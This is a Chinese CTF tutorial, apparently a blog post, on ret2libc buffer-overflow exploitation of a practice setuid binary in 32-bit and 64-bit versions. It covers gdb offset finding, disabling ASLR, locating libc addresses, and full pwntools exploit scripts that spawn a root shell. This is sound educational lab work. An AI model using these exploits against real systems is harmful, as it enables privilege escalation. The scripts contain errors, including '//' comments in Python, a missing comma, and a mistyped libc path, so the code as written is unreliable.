# 简介
“pwn"这个词的源起以及它被广泛地普遍使用的原因，源自于魔兽争霸某段讯息上设计师打字时拼错而造成的，原先的字词应该是"own"这个字，因为 ‘p’ 与 ‘o’ 在标准英文键盘上的位置是相邻的，PWN 也是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似"砰”，对黑客而言，这就是成功实施黑客攻击的声音，而在ctf比赛里，pwn是对二进制漏洞的利用

下载这个github库，进入06文件夹，32位程序文件夹

```
https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
```
# 32位程序
还是和上一篇文件一样，设置文件权限
将flag设置位只能root可读
```
chown root:root flag.txt
chmod 700 flag.txt
chown root:root secureserver
```
设置程序位suid位
```
chmod 4655 secureserver
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ffd0f07df19f43ceb4bb3d5b4abe4fc3.png)
## 获取文件信息
首先我们登录普通用户，然后使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb2f7e617141471187375303faca0424.png)

这里开启了NX防护，意思是我们不能在堆栈中执行shellcode了
从上到下依次是
```
32位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
启用数据执行防护
没有pie，意思是程序的内存空间不会被随机化
```
查看程序源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/e0dffb4465ae4d54a6e18c025f6c8892.png)

```
#include <stdio.h>

int secret_function() {
    asm("jmp %esp");    //汇编语言，意思是跳转到esp寄存器的地址里执行内容
}

void receive_feedback()
{
    char buffer[64];    定义了一个变量，名为buffer，有64个字节的缓冲区

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");   //输出字符
    gets(buffer);   //获取我们输入的内容
}

int main()
{
    setuid(0);    //保证程序以root身份运行
    setgid(0);    //保证程序以root身份运行

    receive_feedback();    //调用receive_feedback()函数

    return 0;
}
```
是上一篇文章的同一个程序，什么都没变，程序只是开启了数据执行防护

我们用上一篇文章的脚本来攻击试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/0d25c86c443445b1b2144f98d5794081.png)

可以看到，我们脚本无法利用成功，因为程序开启了数据执行防护，我们无法运行我们生成的shellcode

## libc库
我们用file工具查看文件信息可以发现


![在这里插入图片描述](https://img-blog.csdnimg.cn/7b6abac58262497cac2bdf8a7958aac8.png)



他是动态链接库的，意思是从libc里调用的函数


![在这里插入图片描述](https://img-blog.csdnimg.cn/b0577556861b488980b926b69feaa589.png)

比如这里的gets函数，他不是二进制文件本身里面自带的，而从本机上的libc库中调用的，这样就能缩小文件体积


![在这里插入图片描述](https://img-blog.csdnimg.cn/1f6c5b5cd5d5489ca47af9998cc8a5fd.png)

点击这里可以查看全局偏移的函数，每当程序调用这些函数时，都会跳转到这个表里，他会查看函数在libc里的偏移量，每个libc版本不同，里面的代码和偏移量也就不同，我们可以利用libc里的函数来破解程序


## 动态调试

用gdb打开程序

```
gdb secureserver
```

输入命令cyclic就能获得测试用的字符串，然后运行程序

```
cyclic 100
run
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fa19e8de5232486a8e50f9306dfd82bc.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6af1deda174a442f87bd3ffd72d48ba0.png)

eip指针原来的返回地址被覆盖成了taaa，我们查一下taaa在刚刚生成的字符的第几个
```
cyclic -l taaa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1640c0e41c1d4be18bc9570606250c62.png)

和上一篇文章的程序一样，说明我们要覆盖eip原本的返回地址并控制，就需要76个字符+想让程序跳转执行的地址

然后我们要找到libc库的地址
```
ldd secureserver
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7cc2d833b86c41c2810fe9d1f132185f.png)


但是每一次运行都是不同的位置，因为开启了地址空间随机化来防止缓冲区溢出攻击

![在这里插入图片描述](https://img-blog.csdnimg.cn/fd174eea594148c098ecda08b003bee4.png)


现在我们关闭这个防护
```
echo 0 > /proc/sys/kernel/randomize_va_space
```
然后再次查看libc库的地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/8798c559f247420e91af0b5393e5fc68.png)

现在地址就不会变了，然后我们要找到system函数的地址，用他来执行/bin/sh，获得shell


```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/cfd83494f1534cfcac6814789cd613ee.png)

现在我们有了system的偏移地址，现在我们还需要/bin/sh的偏移地址，因为/bin/sh是字符串，不是函数，所以我们要用strings工具来找到/bin/sh的偏移地址
```
strings -a -t x /lib/1386-linux-gnu/libc.so.c | grep "/bin/sh"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c4ced7202d9a4a2a82e081001f741c31.png)

现在万事俱备，可以写脚本了
## pwntools脚本


```
from pwn import *   //导入pwntools模块

exe = './secureserver'   //要破解的文件名
elf = context.binary = ELF(exe, checksec=False)   //自动获取程序详细信息，如架构，操作系统
io = process('./secureserver')   //启动程序
padding = 76   //覆盖eip原本的返回地址

libc = 0xf7c00000   //libc的地址
system = libc + 0x46f70   //system函数在libc里的偏移地址
bin_sh = libc + 0x1b30d0   ///bin/sh字符串在libc里的偏移地址

payload = flat(
    asm('nop') * padding,   //覆盖eip原本的返回地址
    system,   //调用system函数地址
    0x0,   //返回指针
    bin_sh  //system执行/bin/sh
)   //构造paylaod
io.sendlineafter(b':',payload)  //发送payload
io.interactive()  //获得交互
```

运行脚本，成功获得flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/fe94d5b87a6b49fba8520004208300d8.png)

# 64位程序
返回进入64位程序文件夹，设置文件权限，将flag设置位只能root可读
```
chown root:root flag.txt
chmod 700 flag.txt
chown root:root secureserver
```
设置程序位suid位
```
chmod 4655 secureserver
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f773f169a5384aa8b33c4d2c46822556.png)
## 获取文件信息
首先我们登录普通用户，然后使用checksec工具可以查看程序更详细的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/56110d3368bb432d89aa5d45c7b60423.png)

这里开启了NX防护，意思是我们不能在堆栈中执行shellcode了
从上到下依次是
```
64位程序
部分RELRO，基本上所有程序都默认的有这个
没有开启栈保护
启用数据执行防护
没有pie，意思是程序的内存空间不会被随机化
有读，写，和执行的段，意思是我们可以在程序里写入shellcode
```

查看程序源代码

![在这里插入图片描述](https://img-blog.csdnimg.cn/55d9d749ac944edba27a154cb14dea11.png)

和上面32位程序是一样的，这里就不多演示了
## 动态调试
用gdb打开程序，然后测试程序的缓冲区区间
```
cyclic 100
run
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/68852be85e924791bf1c0c19e4a8b153.png)
```
unhex 6161617461616173
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1b9bb4b629784492817efc4e94db3360.png)
由于在x86架构里，读取地址是由低到高的，所以这里的字符串是saaataaa
```
cyclic -l saaa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6f5f7a5786e0473a8a6c7d32de52740a.png)
说明我们要覆盖rip原本的返回地址并控制，就需要72个字符+想让程序跳转执行的地址

关于64位程序，可以去看我之前的这篇文章
```
https://blog.csdn.net/qq_45894840/article/details/126814308?spm=1001.2014.3001.5502
```
现在我们需要找到rdi寄存器来传递参数

```
ropper --file secureserver --search "pop rdi"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a88974399f2b43478abbfa5b89f27588.png)

我们可以把/bin/sh字符串放入rdi寄存器中，之后程序查询参数是会在rdi寄存器中查询
```
32位程序会在堆栈中查找，就不需要传递参数
而64位会在这些寄存器中查找参数
```


由于之前关闭过libc防护，现在可以直接查找程序libc库地址
```
ldd secureserver
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e633d2bd961842e49a38fe8603380955.png)

查找system地址和/bin/sh字符串
```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/9a51e1e713a94b40b8e7eed787ff8bff.png)

偏移地址都找到了，现在可以开始写脚本了


## pwntools脚本
这里libc的地址和system函数什么的都已经在上面找过了，我们只需要添加几行代码即可
```
from pwn import *   //导入pwntools模块

exe = './secureserver'   //要破解的文件名
elf = context.binary = ELF(exe, checksec=False)   //自动获取程序详细信息，如架构，操作系统
io = process('./secureserver')   //启动程序
padding = 72   //覆盖eip原本的返回地址

libc = 0x00007ffff7c00000   //libc的地址
system = libc + 0x4a4e0   //system函数在libc里的偏移地址
bin_sh = libc + 0x1b1117   ///bin/sh字符串在libc里的偏移地址

pop_rdi = 0x40120b   //pop rdi指令的地址

payload = flat(
    asm('nop') * padding,   //覆盖eip原本的返回地址
    pop_rdi,   //先存入字符串，之后system函数执行时会在rdi寄存器中寻找参数
    bin_sh  ///bin/sh字符串地址
    system,   //调用system函数地址
    
)   //构造paylaod
io.sendlineafter(b':',payload)  //发送payload
io.interactive()  //获得交互
```


![在这里插入图片描述](https://img-blog.csdnimg.cn/f05044fdac8d4e18b62aea766a2ab02a.png)

成功破解程序
